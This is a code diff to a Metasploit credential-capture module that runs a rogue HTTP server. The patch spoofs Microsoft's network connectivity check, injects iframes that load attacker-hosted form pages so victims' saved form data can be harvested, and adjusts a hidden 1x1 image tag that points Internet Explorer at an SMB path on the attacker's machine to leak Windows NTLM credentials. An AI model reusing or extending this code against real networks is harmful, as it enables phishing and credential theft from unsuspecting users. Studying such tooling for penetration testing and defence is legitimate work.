@@ -217,8 +217,8 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 				"HTTP/1.1 200 OK\r\n" +
 				"Host: #{hhead}\r\n" +
 				"Content-Type: text/html\r\n" +
-				"Content-Length: 0\r\n" +
-				"Connection: Close\r\n\r\n"
+				"Content-Length: 4\r\n" +
+				"Connection: Close\r\n\r\nBYE!"
 				
 			print_status("HTTP form data received for #{hhead} from #{cli.peerhost} (#{data})")
 			cli.put(res)
@@ -246,8 +246,33 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		end
 		
 		
-
+		# http://us.version.worldofwarcraft.com/update/PatchSequenceFile.txt
+		if(req.resource == "/update/PatchSequenceFile.txt")
+			print_status("HTTP #{cli.peerhost} is trying to play World of Warcraft")			
+		end
 		
+		
+		# Microsoft 'Network Connectivity Status Indicator' Vista
+		if (req['Host'] == 'www.msftncsi.com:80')
+			print_status("HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)")
+			data = "Microsoft NCSI"
+			res  = 
+				"HTTP/1.1 200 OK\r\n" +
+				"Host: #{mysrc}\r\n" +
+				"Expires: 0\r\n" +
+				"Cache-Control: must-revalidate\r\n" +
+				"Content-Type: text/html\r\n" +
+				"Content-Length: #{data.length}\r\n" +
+				"Connection: Close\r\n\r\n#{data}"
+			cli.put(res)
+			return			
+		end
+
+
+		# Sonic.com's Update Service
+		if (req['Host'] == 'updateservice.sonic.com:80')
+			print_status("HTTP #{cli.peerhost} is running a Sonic.com product that checks for online updates")
+		end		
 		
 		# The google maps / stocks view on the iPhone
 		if (req['Host'] == 'iphone-wu.apple.com')
@@ -305,11 +330,11 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			next if site =~ /^#/
 			site.strip!
 			next if site.length == 0
-			buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
+			buff << "<iframe src='http://www.#{site}:#{@myport}/forms.html'></iframe>"
 		end
 
 		if(ua_name == "IE")
-			buff << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
+			buff << "<img src='\\\\\\\\#{mysrc}\\\\public#{Time.now.to_i.to_s}\\\\loading.jpg' width='1' height='1'>"
 		end
 		
 		data = File.read(@template)
@@ -332,10 +357,21 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	
 	def inject_forms(site)
 
-		form_file = File.join(@formsdir, site.gsub(/(\.\.|\\|\/)/, "") + ".txt")
-		form_data = ""
-		if (File.readable?(form_file))
-			form_data = File.read(form_file)
+		domain = site.gsub(/(\.\.|\\|\/)/, "")
+		domain = "www." + domain if domain !~ /^www/i
+		
+		while(domain.length > 0)
+
+			form_file = File.join(@formsdir, domain) + ".txt"
+			form_data = ""
+			if (File.readable?(form_file))
+				form_data = File.read(form_file)
+				break
+			end
+			
+			parts = domain.split(".")
+			parts.shift
+			domain = parts.join(".")
 		end
 			
 		%|
